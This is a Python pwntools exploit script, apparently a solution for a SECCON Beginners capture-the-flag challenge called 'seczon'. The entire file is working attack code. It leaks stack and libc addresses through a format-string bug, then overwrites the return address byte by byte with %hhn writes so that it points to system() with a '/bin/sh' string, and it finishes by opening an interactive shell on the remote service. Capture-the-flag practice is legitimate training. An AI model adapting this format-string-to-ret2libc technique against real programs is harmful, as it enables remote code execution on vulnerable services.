from pwn import *

# libc = ELF('/lib32/libc.so.6')
libc = ELF('./libc-2.23.so')

# OFFSET_SH = 0x15cccd
OFFSET_SH = 0x15ba10

# r = process('seczon')
r = remote('pwn1.chall.beginners.seccon.jp', 21735)

def write_byte(addr, byte):
	r.sendline('2')
	r.sendline('0')

	payload = ''
	payload += '%{}c%10$hhn'.format(byte)
	payload += 'A' * (15 - len(payload))
	payload += p32(addr)
	r.sendline(payload)

def write_dword(addr, dword):
	for i in xrange(4):
		write_byte(addr + i, dword >> i * 8 & 0xff)

r.sendline('1')
r.sendline('hoge')

r.sendline('2')
r.sendline('0')
r.sendline('%18$x %19$x')

r.recvuntil('hoge\n')
s = r.recvline().split()

RET_ADDR_FROM_MAIN = int(s[0], 16) + 0x14
CALL_PRINTF = int(s[1], 16) - 0xfe3 + 0xcf6

r.sendline('2')
r.sendline('0')
r.sendline('%8$s   ' + p32(CALL_PRINTF + 1))

r.recvuntil('hoge\n')
LIBC_BASE = u32(r.recv(4)) + CALL_PRINTF + 5 - libc.symbols['printf']

write_dword(RET_ADDR_FROM_MAIN, LIBC_BASE + libc.symbols['system'])
write_dword(RET_ADDR_FROM_MAIN + 8, LIBC_BASE + OFFSET_SH)

r.sendline('0')

r.interactive()
